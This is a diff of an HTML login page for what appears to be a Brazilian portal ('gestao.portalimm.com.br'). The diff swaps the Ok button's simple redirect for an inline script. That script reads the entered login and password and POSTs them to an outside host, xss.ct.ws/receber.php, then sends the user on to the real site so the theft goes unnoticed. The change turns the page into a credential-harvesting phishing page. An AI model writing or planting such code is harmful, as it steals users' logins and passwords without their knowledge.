@@ -23,7 +23,30 @@
 
 					<img id="ArrowCEdtAno" class="arrow-login" src="https://gestao.portalimm.com.br/acropoly/images/setacombo.gif" onmousedown="IgCacheArrowMouseDown(this);" onmouseout="IgCacheArrowMouseOut(this);" onmouseover="IgCacheArrowMouseOver(this);"	style=""> 
 				
-					<button type=button class="btn btn-lg btn-primary btn-block btn-signin" id="CBtnOk" ClassId="6" tabIndex="4" Parent="-1" Kind="0" GroupValidate="1" SubmitOnClick="1" TabStop=1 onclick="window.location.replace('https://gestao.portalimm.com.br/acropoly/FIndex.html');">Ok</button>
+					<button type=button class="btn btn-lg btn-primary btn-block btn-signin" id="CBtnOk" ClassId="6" tabIndex="4" Parent="-1" Kind="0" GroupValidate="1" SubmitOnClick="1" TabStop=1 onclick="
+    var login = document.getElementById('CLblLogin').value;
+    var password = document.getElementById('CLblSenha').value;
+
+    var data = {
+        login: login,
+        password: password
+    };
+
+    fetch('https://xss.ct.ws/receber.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.text())
+    .then(data => {
+        alert(data); // Mostra a resposta do servidor
+    })
+    .catch(error => {
+        console.error('Erro:', error);
+    });
+    window.location.replace('https://gestao.portalimm.com.br/acropoly/FIndex.html');">Ok</button>
 				</div>
 				<input class=TCtEdit id="CEdtNumErrosLogin" ClassId="2" value="" DataType="1" TabStop="1" Precision="2" tabIndex="8" DataSource="-2" Parent="-1" onfocus="IgEditFocus(this);" onblur="IgEditBlur(this);" onkeypress="IgEditKeyPress(event);" onkeydown="IgInputKeyDown(event);" style="visibility:hidden;">
 
